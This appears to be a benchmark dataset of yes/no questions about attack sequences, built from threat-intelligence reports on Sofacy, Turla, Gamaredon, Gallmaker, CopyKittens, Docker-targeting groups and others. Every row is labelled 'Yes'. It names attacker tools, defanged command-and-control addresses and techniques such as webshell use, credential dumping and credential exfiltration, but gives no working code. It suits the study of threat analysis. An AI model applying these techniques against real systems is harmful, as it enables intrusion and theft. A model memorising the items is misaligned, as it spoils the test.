572,173,173-Defense Evasion-T1027-Obfuscated Files or Information,"After registering new domain names that closely resemble those of legitimate organizations in preparation for a phishing campaign, is it likely that Sofacy attackers will employ phishing techniques with obfuscated code to redirect users to malicious webpages before setting up fake login pages to steal credentials?","Defense Evasion: The Sofacy attackers have employed phishing techniques to steal credentials, using obfuscated code to redirect users to malicious webpages. In some instances, they have disabled the malicious redirect, opting to send users to legitimate sites instead. They have created fake login pages for webmail and two-factor authentication platforms, requiring simultaneous login attempts by the attackers when victims are logging in. The phishing pages are designed to closely resemble the legitimate sites they are impersonating, making it difficult for users to detect the deception.","Initial Access: Sofacy, a threat group, has been observed registering new domain names that closely resemble those of legitimate organizations. These domains are linked through shared WHOIS data and infrastructure, suggesting the preparation for a new phishing campaign. The domains mimic entities in various sectors, including international and European diplomatic institutions, web service providers, military institutions, contractors and conferences, energy companies, and news organizations in the US and Central Europe.
Credential Access: Sofacy has used phishing techniques to steal credentials, including setting up fake login pages for webmail and two-factor authentication platforms. The attackers have shown dedication by attempting to log in simultaneously with the victims. The phishing pages are crafted to look like legitimate sites, making it difficult for users to recognize the fraud.
Others: The CTI report from PricewaterhouseCoopers LLP dated 2014-10-22 details a phishing campaign by the threat group Sofacy. The campaign targets various sectors with fake domains and phishing pages. The report includes Snort signatures to detect potential Sofacy phishing redirects and advises on educating staff to identify suspicious emails. For further information and indicators of compromise, contact is provided via threatintelligence@uk.pwc.com. An extensive list of domains associated with the campaign is appended.",Yes,tactical-intelligence-bulletin---sofacy-phishing-
577,174,174-Initial Access-T1190-Exploit Public-Facing Application,"After exploiting CVE-2019-0604 to install the AntSword webshell for initial access, is it likely that the threat actors will leverage the AntSword webshell to run commands for system and user discovery before evading defenses using a custom Mimikatz variant with a .NET loader?","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.","Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
584,174,174-Lateral Movement-T1550-Use Alternate Authentication Material,"After running various discovery commands to gather network configuration, user accounts, and remote systems, is it likely that the actors used webshells for lateral movement to other systems by dumping credentials with a Mimikatz variant and using Impacket's atexec tool?","Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
590,175,175-Execution-T1059-Command and Scripting Interpreter,"After exploiting misconfigured Docker API ports exposed to the internet and tricking developers into pulling and running malicious container images, is it likely that attackers will abuse command and script interpreters to execute scripts or binaries before using LD_PRELOAD to hijack execution flow for persistence?","Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
594,175,175-Defense Evasion-T1562-Impair Defenses,"After gaining initial access by exploiting misconfigured Docker API ports exposed to the internet, is it likely that attackers will attempt to collect credentials and usernames from the victim’s environment before impairing defenses by removing security software?","Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
604,175,175-Reconnaissance-T1595-Active Scanning,"After attackers exploited misconfigured Docker API ports exposed to the internet for initial access, is it likely that adversaries will detect compromised Docker APIs using tools like DOCKERGEDDON during reconnaissance before deploying malicious containers?","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.","Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
611,176,176-Initial Access-T1190-Exploit Public-Facing Application,"After using tools like Medusa, Simple SMTP Scanner, Fast SYN Scanner, and RealVNC Viewer 5.2.3 for Reconnaissance to enumerate services and authenticate via brute force, is it likely that attackers will employ Advanced IP Scanner, Radmin, and PushVNC package for identifying internal hosts and remotely controlling software during Initial Access before attempting to evade defenses using AutoExe1.bat and AutoExe.bat?","Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.","Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.
Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",Yes,Operation_Black Atlas_Technical_Brief
615,177,177-Command and Control-T1102-Web Service,"After employing obfuscation within a VBS script for defense evasion and configuring the script to delete itself post-execution, is it likely that the VBS script will communicate with a command and control (C&C) server located at 'hxxp://kristom[.]hopto[.]org/{computer name}_{hexadecimal volume serious number}/help_05_03[.]php'?","Command and Control: The VBS script communicated with a command and control (C&C) server located at 'hxxp://kristom[.]hopto[.]org/{computer name}_{hexadecimal volume serious number}/help_05_03[.]php'. However, during the analysis, the C&C server was not accessible, preventing the acquisition of additional payloads.","Initial Access: The Gamaredon APT group initiated their campaign by distributing targeted emails containing malicious document files. These emails leveraged the COVID-19 pandemic as a lure, with subjects such as 'Coronavirus (2019-nCoV)' to entice victims to open the attachments. The attack utilized a template injection technique to load a document template from the internet, which contained malicious macro codes.
Execution: Upon opening the malicious document, the embedded macro code executed a VBScript (VBS) that was obfuscated. The VBS, named 'PlayList.vbs', was dropped into the '%USERPROFILE%\Documents\MediaPlayer' directory and then executed using 'wscript.exe'.
Persistence: The VBS script was designed to register a RUN key in the Windows registry to ensure its execution at every system startup.
Defense Evasion: The Gamaredon group employed obfuscation techniques within the VBS script to evade detection. Additionally, the VBS script was designed to delete itself after execution to further avoid detection.
Others: The Gamaredon APT group has been active since 2013, primarily targeting Ukrainian government institutions. The group's activities were tracked from late 2019 to February 2020, with several reports published. The group's use of COVID-19 as a lure is part of a broader trend of threat actors exploiting the pandemic. The IP addresses used for the attack infrastructure were linked to Russian hosting companies, suggesting the use of rented Virtual Private Servers (VPS) for the attacks. The article recommends vigilance against suspicious emails, careful examination of file extensions, and caution with email attachments, especially those requesting macro activation. Trend Micro provides multiple security solutions to protect against such threats.",Yes,Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog
628,179,179-Defense Evasion-T1027-Obfuscated Files or Information,"After executing the malware by rewriting itself to the %Temp% folder with a randomized Hex-filename and '.tmp' extension, is it likely that the malware will employ evasion techniques and use obfuscation to minimize visibility and avoid detection?","Defense Evasion: The malware employs evasion techniques such as minimizing the script window and avoiding the display of the window taskbar. It also uses obfuscation to hide the writing of binary codes as HEX to form files, and it checks for the existence of files before deletion to ensure persistence.","Initial Access: The CTI report details an APT campaign targeting individuals with malware delivered via a file named 'Thu moi.7z' containing 'Thumoi.hta'. Upon execution, the HTA file drops and opens a decoy Microsoft Word DOC file while simultaneously executing a backdoor in the background. The malware installer utilizes embedded VB Script to extract and execute the payload, employing techniques to minimize visibility and avoid detection.
Execution: The malware executes by deleting the original file and rewriting itself to the %Temp% folder with a randomized Hex-filename and '.tmp' extension. This self-copied file is polymorphic, with each execution resulting in a different MD5 hash. The malware then creates a new process to execute the dropped '.exe' file.
Others: The CTI report indicates that the malware campaign is suspected to be backed by a group with a significant budget, aiming to spy on specific individuals opposed to a country's political methods. The malware is designed to appear as a common threat but employs sophisticated techniques for spying. The analysis of the malware revealed that it is part of an APT attack with potential political motivations, and the campaign has been active since at least 2009. The report also mentions that the domains used by the malware for command and control have a history of phishing and malware distribution. The investigation into the malware and its associated network is ongoing, with an open call for further information related to the threat.",Yes,blog.malwaremustdie.org-Another country-sponsored malware Vietnam APT Campaign
633,180,180-Command and Control-T1071-Application Layer Protocol,"After privilege escalation using the Metasploit module ext_server_priv.x86.dll, is it likely that the shellcode will contact its C&C at https://209.239.115[.]91/6OHEJ and resolve the domain psychology-blog.ezua[.]com to the IP address 209.239.115[.]91 for further malicious activity?","Command and Control: Once the shellcode is decoded, it contacts its C&C at https://209.239.115[.]91/6OHEJ, which directs the download of an additional shellcode. The IP address is known as a previously seen Mosquito C&C domain, psychology-blog.ezua[.]com, was resolving to it in October 2017.","Initial Access: Starting in March 2018, Turla's Mosquito campaign leveraged the open-source exploitation framework Metasploit before dropping the custom Mosquito backdoor. The typical vector of compromise is a fake Flash installer, which installs both the Turla backdoor and the legitimate Adobe Flash Player. The compromise occurs when the user downloads a Flash installer from get.adobe.com via HTTP, and the traffic is intercepted, allowing Turla's operators to replace the legitimate Flash executable with a trojanized version.
Execution: The Mosquito campaign initially involved a fake Flash installer dropping a loader and the main backdoor. Recently, the campaign still uses a fake Flash installer, but instead of directly dropping the malicious DLLs, it executes a Metasploit shellcode and drops or downloads a legitimate Flash installer from Google Drive. The shellcode then downloads a Meterpreter, allowing the attacker to control the compromised machine, and may eventually drop the typical Mosquito backdoor.
Persistence: A custom executable containing the Metasploit shellcode, named msupdateconf.exe, is used to maintain access to a Meterpreter session. It is saved to the Startup folder, granting persistence. Another custom executable is used to execute PowerShell scripts.
Privilege Escalation: Privilege escalation is achieved using the Metasploit module ext_server_priv.x86.dll.
Others: Turla is an espionage group active for over ten years, known for targeting governments and sensitive businesses such as the defense industry. The Mosquito campaign has been active since at least January 2018, with Turla changing tactics to remain stealthy. In addition to the fake Flash installer and Meterpreter, Turla uses several other tools, including a Mosquito JScript backdoor that uses Google Apps Script as its C&C server.",Yes,turla-mosquito-shift-towards-generic-tools
656,183,183-Execution-T1053-Scheduled Task/Job,"After initiating their attack by exploiting the Microsoft Office DDE protocol to execute commands in memory, is it likely that Gallmaker would use tools such as WindowsRoamingToolsTask for scheduling PowerShell scripts and tasks before employing living off the land (LotL) tactics to evade detection and remove tools from victim machines?","Execution: Upon gaining access to a victim's device, Gallmaker executed various tools including WindowsRoamingToolsTask for scheduling PowerShell scripts and tasks, a 'reverse_tcp' payload from Metasploit via obfuscated PowerShell, a legitimate version of the WinZip console for command execution and potential data exfiltration, and the Rex PowerShell library from GitHub for creating and manipulating PowerShell scripts for Metasploit exploits.","Initial Access: The Gallmaker group initiated their attack by delivering malicious Office documents, likely through spear-phishing emails, with titles related to government, military, and diplomatic themes. These documents, with filenames in English or Cyrillic, attempted to exploit the Microsoft Office Dynamic Data Exchange (DDE) protocol to execute commands in memory on the victim's system when the content was enabled, thus avoiding leaving artifacts on disk.
Defense Evasion: Gallmaker's use of living off the land (LotL) tactics and publicly available hack tools, as well as their practice of deleting tools from victim machines after use, helped them avoid detection. They exploited the DDE protocol to execute code remotely without leaving artifacts on disk.
Command and Control: Gallmaker used three primary IP addresses for command-and-control (C&C) infrastructure to communicate with infected devices. They also likely used the WinZip console to archive data for exfiltration.
Exfiltration: The legitimate version of the WinZip console was likely used by Gallmaker to archive data, probably for the purpose of exfiltration.
Others: Gallmaker targeted government, military, and defense sectors, including overseas embassies of an Eastern European country and military and defense targets in the Middle East. The group has been active since at least December 2017, with the most recent activity observed in June 2018. Their activities are indicative of a cyber espionage campaign, likely state-sponsored. Symantec's Targeted Attack Analytics (TAA) technology played a crucial role in detecting Gallmaker's activities, which relied on LotL tactics and publicly available hack tools to avoid detection. Protections against Gallmaker attacks include System Infected: Meterpreter Reverse TCP and W97M.Downloader. Network protection products also detect activity associated with Gallmaker. Indicators of Compromise (IoCs) specific to Gallmaker have been updated, and Yara rules and methods used by Gallmaker are shared for detection of unauthorized activity.",Yes,Gallmaker New Attack Group Eschews Malware to Live off the Land
659,183,183-Defense Evasion-T1070-Indicator Removal,"After delivering malicious Office documents via spear-phishing emails to exploit the DDE protocol for commands in memory, is Gallmaker likely to use living off the land (LotL) tactics and remove tools from the victim’s machines after executing PowerShell-based Metasploit payloads for defense evasion?","Defense Evasion: Gallmaker's use of living off the land (LotL) tactics and publicly available hack tools, as well as their practice of deleting tools from victim machines after use, helped them avoid detection. They exploited the DDE protocol to execute code remotely without leaving artifacts on disk.","Initial Access: The Gallmaker group initiated their attack by delivering malicious Office documents, likely through spear-phishing emails, with titles related to government, military, and diplomatic themes. These documents, with filenames in English or Cyrillic, attempted to exploit the Microsoft Office Dynamic Data Exchange (DDE) protocol to execute commands in memory on the victim's system when the content was enabled, thus avoiding leaving artifacts on disk.
Execution: Upon gaining access to a victim's device, Gallmaker executed various tools including WindowsRoamingToolsTask for scheduling PowerShell scripts and tasks, a 'reverse_tcp' payload from Metasploit via obfuscated PowerShell, a legitimate version of the WinZip console for command execution and potential data exfiltration, and the Rex PowerShell library from GitHub for creating and manipulating PowerShell scripts for Metasploit exploits.
Command and Control: Gallmaker used three primary IP addresses for command-and-control (C&C) infrastructure to communicate with infected devices. They also likely used the WinZip console to archive data for exfiltration.
Exfiltration: The legitimate version of the WinZip console was likely used by Gallmaker to archive data, probably for the purpose of exfiltration.
Others: Gallmaker targeted government, military, and defense sectors, including overseas embassies of an Eastern European country and military and defense targets in the Middle East. The group has been active since at least December 2017, with the most recent activity observed in June 2018. Their activities are indicative of a cyber espionage campaign, likely state-sponsored. Symantec's Targeted Attack Analytics (TAA) technology played a crucial role in detecting Gallmaker's activities, which relied on LotL tactics and publicly available hack tools to avoid detection. Protections against Gallmaker attacks include System Infected: Meterpreter Reverse TCP and W97M.Downloader. Network protection products also detect activity associated with Gallmaker. Indicators of Compromise (IoCs) specific to Gallmaker have been updated, and Yara rules and methods used by Gallmaker are shared for detection of unauthorized activity.",Yes,Gallmaker New Attack Group Eschews Malware to Live off the Land
666,184,184-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After utilizing spear phishing emails with infected document files to achieve initial access, is it likely that the CopyKittens group will employ a multi-stage infection framework with anti-debugging and anti-sandboxing techniques during execution, before ensuring persistence through scheduled tasks and registry key creation?","Defense Evasion: The CopyKittens group utilized techniques to avoid detection, such as employing anti-debugging and anti-sandboxing methods, and runtime API address resolution with obfuscated strings. They also used a global mutex to reduce the risk of multiple RAT instances running simultaneously.","Initial Access: The CopyKittens attack group initiated their cyber-attacks with spear phishing emails containing infected document files as attachments. These emails were carefully crafted with subjects that matched the interests of the targets, such as high-ranking diplomats and academic researchers. The documents contained OLE binary objects with deceptive names using the Right-To-Left Override Unicode character to appear as harmless file types.
Execution: The CopyKittens group employed a multi-stage infection framework named 'Matryoshka'. The first stage involved a dropper, an SCR PE file, which obfuscated code and signaled to the C2 server upon execution. It launched a loader to execute functions and compared anti-analysis logic, reporting back to C2. The second stage, the Reflective Loader, used anti-debugging and anti-sandboxing techniques, runtime API address resolution, covert DLL injection of the RAT library, and ensured persistence on disk. The third stage was the RAT component, which configured the Reflective Loader to survive reboots and process exits, established DNS Command and Control communication, and provided common RAT functionalities.
Persistence: The RAT component of the Matryoshka framework ensured its persistence by copying the reflective loader to common Windows folders and creating a registry key for automatic execution upon system boot. Additionally, it scheduled a task named 'Microsoft Boost Kernel Optimization' to rerun the injection routine every 20 minutes, using a global mutex to prevent multiple instances from causing instability.
Credential Access: The RAT was capable of stealing Outlook passwords, a method that may have been copied from SecurityExploded's description for 'Recovering Passwords from Outlook 2002-2013'.
Collection: The RAT had capabilities for screen grabbing and keylogging, with portions of the source code traced back to the rohitab.com online forum.
Command and Control: The RAT used the DNS protocol to communicate with the C2 server, constructing DNS queries with a unique ID of the infected machine, a random string, and obfuscated data to be transmitted. The group used substitute ciphers to disguise the DNS traffic and made it difficult for traffic analysis and detection by using IP addresses from Microsoft and McAfee in the C2 responses.
Exfiltration: Data exfiltration was performed over the DNS protocol, with the RAT translating received commands from the C2 server into corresponding actions, such as stealing Outlook passwords when a specific IP address was received in the DNS response.
Others: The CopyKittens attack group is a mid-level threat actor known for their effective and stealthy multi-stage attacks, avoiding the use of known RATs and packers by developing 'homemade' tools. They have shown constant development to overcome security product improvements. The group's targets have included high-ranking diplomats and researchers specializing in Middle East Studies. The group's attack tool, 'Matryoshka', is a multi-stage framework with each part built to integrate with the subsequent step. The group's activities suggest that they will continue to target similar profiles in the future.",Yes,CopyKittens
668,184,184-Defense Evasion-T1564-Hide Artifacts,"After the RAT component of Matryoshka ensures persistence by creating a registry key for automatic execution upon system boot, is it likely that the CopyKittens group will use global mutex to reduce the risk of multiple RAT instances running simultaneously?","Defense Evasion: The CopyKittens group utilized techniques to avoid detection, such as employing anti-debugging and anti-sandboxing methods, and runtime API address resolution with obfuscated strings. They also used a global mutex to reduce the risk of multiple RAT instances running simultaneously.","Initial Access: The CopyKittens attack group initiated their cyber-attacks with spear phishing emails containing infected document files as attachments. These emails were carefully crafted with subjects that matched the interests of the targets, such as high-ranking diplomats and academic researchers. The documents contained OLE binary objects with deceptive names using the Right-To-Left Override Unicode character to appear as harmless file types.
Execution: The CopyKittens group employed a multi-stage infection framework named 'Matryoshka'. The first stage involved a dropper, an SCR PE file, which obfuscated code and signaled to the C2 server upon execution. It launched a loader to execute functions and compared anti-analysis logic, reporting back to C2. The second stage, the Reflective Loader, used anti-debugging and anti-sandboxing techniques, runtime API address resolution, covert DLL injection of the RAT library, and ensured persistence on disk. The third stage was the RAT component, which configured the Reflective Loader to survive reboots and process exits, established DNS Command and Control communication, and provided common RAT functionalities.
